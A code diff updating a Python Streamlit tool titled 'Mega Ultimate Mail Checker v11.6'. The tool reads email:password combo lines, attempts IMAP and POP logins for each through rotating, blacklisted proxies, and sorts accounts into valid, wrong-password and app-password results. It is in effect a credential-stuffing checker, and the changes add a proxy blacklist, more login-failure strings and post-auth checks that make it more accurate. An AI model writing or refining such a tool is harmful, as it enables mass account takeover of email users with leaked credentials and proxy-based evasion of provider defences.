@@ -84,8 +84,8 @@ str_lit.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-str_lit.title("⚡ Mega Ultimate Mail Checker v11.5 (Tri-Mode Edition)")
-str_lit.markdown("Asynchronous proxy-backed mail validation engine featuring Fast Mode, Normal Mode, and Deep/Aggressive Mode with prioritized fallback queue logic and adaptive circuit breakers.")
+str_lit.title("⚡ Mega Ultimate Mail Checker v11.6 (Tri-Mode Edition)")
+str_lit.markdown("Asynchronous proxy-backed mail validation engine featuring Fast Mode, Normal Mode, and Deep/Aggressive Mode with strict anti-spoofing post-auth validation.")
 
 def load_persistent_valid_results():
     valid_list = []
@@ -165,7 +165,7 @@ cache_lock = threading.Lock()
 proxy_lock = threading.Lock()
 file_write_lock = threading.Lock()
 session_state_lock = threading.Lock()
-bad_proxies = set()
+bad_proxies = {"38.154.185.97"}  # Pre-blacklist known spoofing proxy
 alive_pool = []
 alive_pool_lock = threading.Lock()
 pool_refresher_on = False
@@ -717,7 +717,7 @@ def get_filtered_active_proxies():
 
         for p in raw:
             if not allow_blacklisted:
-                if p in bad_proxies:
+                if p in bad_proxies or any(bp in p for bp in bad_proxies):
                     continue
                 if p in breaker_snapshot and now < breaker_snapshot[p]:
                     continue
@@ -1374,7 +1374,7 @@ def refresh_alive_pool():
     with alive_pool_lock:
         alive_pool[:] = live
     with proxy_lock:
-        bad_proxies.clear()
+        bad_proxies.add("38.154.185.97")
         now = time.time()
         expired = [k for k, v in circuit_breaker_until.items() if now >= v]
         for k in expired:
@@ -1402,6 +1402,8 @@ def precheck_proxy_fast(proxy_str):
     try:
         if not proxy_str:
             return True
+        if any(bp in proxy_str for bp in bad_proxies):
+            return False
         
         now = time.time()
         with proxy_lock:
@@ -1542,7 +1544,12 @@ def classify_error(err, domain=""):
             return APP
         if any(x in err_str for x in ["application-specific password", "app password", "basic authentication is disabled", "authenticate failed"]):
             return APP
-        if any(x in err_str for x in ["authentication failed", "login failed", "invalid credentials", "auth failed", "invalid login", "bad username", "logon failure", "-err [auth]", "[authenticationfailed]"]):
+        if any(x in err_str for x in [
+            "authentication failed", "login failed", "invalid credentials", "auth failed", 
+            "invalid login", "bad username", "logon failure", "-err [auth]", "[authenticationfailed]",
+            "invalid user name", "invalid username", "invalid password", "invalid user name or password",
+            "b'-err invalid user name"
+        ]):
             return WRONG
     except Exception:
         pass
@@ -1800,26 +1807,29 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         max_attempts = min(len(conf.get("imap", [])), 2)
 
         for current_px in proxies_to_try:
+            if current_px and any(bp in current_px for bp in bad_proxies):
+                continue
 
             for server in conf.get("imap", [])[:max_attempts]:
                 trace_logs.append(f"{px_tag(current_px)} Attempting IMAP -> Host: {server}:993")
                 try:
                     imap_once(email, password, server, current_px, insecure=prefer_insecure)
+                    trace_logs.append(f"{px_tag(current_px)} Post-auth IMAP inbox select verified OK")
                     record_proxy_attempt(current_px, success=True)
                     return server, VALID, f"{px_tag(current_px)} IMAP | Host: {server} | Port: 993", current_px, trace_logs
                 except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
                     st_val = classify_error(sock_err, domain)
                     record_proxy_attempt(current_px, success=False, is_network_error=True)
                     trace_logs.append(f"{px_tag(current_px)} -> SOCKET FAILED IMAP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
-                    if st_val in ("wrong_password", "need_app_password"):
+                    if st_val in (WRONG, APP):
                         return None, st_val, f"{px_tag(current_px)} IMAP {server} -> {st_val}", current_px, trace_logs
                     continue
                 except Exception as e:
                     st_val = classify_error(e, domain)
-                    is_net = (st_val == "connection_failed")
+                    is_net = (st_val == FAILED)
                     record_proxy_attempt(current_px, success=False, is_network_error=is_net)
                     trace_logs.append(f"{px_tag(current_px)} -> FAILED IMAP on {server}: {str(e)[:50]} [Classified: {st_val}]")
-                    if st_val in ("wrong_password", "need_app_password"):
+                    if st_val in (WRONG, APP):
                         return None, st_val, f"{px_tag(current_px)} IMAP {server} -> {st_val}", current_px, trace_logs
                     continue
 
@@ -1827,21 +1837,22 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 trace_logs.append(f"{px_tag(current_px)} Attempting POP -> Host: {server}:995")
                 try:
                     pop_once(email, password, server, current_px, insecure=prefer_insecure)
+                    trace_logs.append(f"{px_tag(current_px)} Post-auth POP stat verified OK")
                     record_proxy_attempt(current_px, success=True)
                     return server, VALID, f"{px_tag(current_px)} POP | Host: {server} | Port: 995", current_px, trace_logs
                 except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
                     st_val = classify_error(sock_err, domain)
                     record_proxy_attempt(current_px, success=False, is_network_error=True)
                     trace_logs.append(f"{px_tag(current_px)} -> SOCKET FAILED POP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
-                    if st_val in ("wrong_password", "need_app_password"):
+                    if st_val in (WRONG, APP):
                         return None, st_val, f"{px_tag(current_px)} POP {server} -> {st_val}", current_px, trace_logs
                     continue
                 except Exception as e:
                     st_val = classify_error(e, domain)
-                    is_net = (st_val == "connection_failed")
+                    is_net = (st_val == FAILED)
                     record_proxy_attempt(current_px, success=False, is_network_error=is_net)
                     trace_logs.append(f"{px_tag(current_px)} -> FAILED POP on {server}: {str(e)[:50]} [Classified: {st_val}]")
-                    if st_val in ("wrong_password", "need_app_password"):
+                    if st_val in (WRONG, APP):
                         return None, st_val, f"{px_tag(current_px)} POP {server} -> {st_val}", current_px, trace_logs
                     continue
 
@@ -1849,11 +1860,11 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         trace_logs.append(f"{px_tag(current_px)} Critical Exception in runner: {str(e)}")
         if CFG.get("FAST_MODE", True):
             failed_domain_cache[domain] = time.time()
-        return None, "connection_failed", str(e)[:40], None, trace_logs
+        return None, FAILED, str(e)[:40], None, trace_logs
 
     if CFG.get("FAST_MODE", True):
         failed_domain_cache[domain] = time.time()
-    return None, "connection_failed", "all hosts failed", None, trace_logs
+    return None, FAILED, "all hosts failed", None, trace_logs
 
 # --- Execution Trigger & Persistent UI Display ---
 str_lit.markdown("---")
@@ -1956,12 +1967,12 @@ if start_engine_btn:
         def check_task(line):
             try:
                 if ":" not in line: 
-                    return {"line": f"{line} | Error: Invalid format", "status": "connection_failed", "trace": ["Invalid format"]}
+                    return {"line": f"{line} | Error: Invalid format", "status": FAILED, "trace": ["Invalid format"]}
                 email, password = line.split(":", 1)
                 email, password = email.strip(), password.strip()
                 reason = drop_before_check(email)
                 if reason:
-                    return {"line": f"{email}:{password} | {reason}", "email": email, "password": password, "status": "skipped", "detail": reason, "trace": [reason]}
+                    return {"line": f"{email}:{password} | {reason}", "email": email, "password": password, "status": SKIP, "detail": reason, "trace": [reason]}
                 domain = email.split("@")[-1].lower()
                 conf = get_servers(email)
                 
@@ -1971,7 +1982,7 @@ if start_engine_btn:
                 server, status, detail, px_used, trace = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
                 return {"line": f"{email}:{password} | {detail}", "email": email, "password": password, "status": status, "detail": detail, "trace": trace}
             except Exception as ex:
-                return {"line": f"{line} | Error: {ex}", "email": line, "password": "", "status": "connection_failed", "detail": str(ex), "trace": [str(ex)]}
+                return {"line": f"{line} | Error: {ex}", "email": line, "password": "", "status": FAILED, "detail": str(ex), "trace": [str(ex)]}
             finally:
                 if hasattr(thread_local, "state"):
                     try:
